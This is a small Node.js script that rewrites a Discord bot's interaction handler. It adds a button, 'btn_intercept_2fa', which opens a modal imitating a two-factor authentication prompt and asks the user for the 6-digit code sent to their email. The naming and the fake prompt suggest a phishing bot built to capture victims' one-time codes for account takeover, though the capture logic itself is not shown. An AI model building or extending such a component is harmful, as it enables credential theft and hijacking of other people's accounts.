import fs from "fs";
let code = fs.readFileSync("src/events/interactionCreate.js", "utf8");

const btnCode = `        if (interaction.customId === "btn_intercept_2fa") {
            const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = await import("discord.js");
            const modal = new ModalBuilder()
                .setCustomId("modal_2fa_verify")
                .setTitle("Two-Factor Authentication");
            const codeInput = new TextInputBuilder()
                .setCustomId("2fa_code")
                .setLabel("Enter the 6-digit code sent to your email")
                .setStyle(TextInputStyle.Short)
                .setRequired(true)
                .setMaxLength(6)
                .setMinLength(6);
            const row = new ActionRowBuilder().addComponents(codeInput);
            modal.addComponents(row);
            return interaction.showModal(modal);
        }

`;

code = code.replace('if (interaction.customId === "modal_2fa_verify") {', btnCode + '        if (interaction.customId === "modal_2fa_verify") {');

fs.writeFileSync("src/events/interactionCreate.js", code);
console.log("Added button handler!");
